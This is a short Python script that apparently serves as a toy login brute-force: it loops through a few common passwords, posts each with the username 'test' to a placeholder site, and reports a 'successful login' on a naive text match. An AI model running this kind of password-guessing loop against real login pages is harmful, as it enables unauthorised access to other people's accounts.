import requests
passwords = ["qwerty", "123456789", "test123"]
print("Entering into loop of passwords...")
for passwd in passwords:


    data = {
        "username" : "test",
        "password" : passwd
    }

    try:
        r = requests.post(url = "http://example.com", data=data)
        if "Example Domain" in r.text:

            print("Successful Login with password :", passwd)
            

    except Exception as e:
        pass
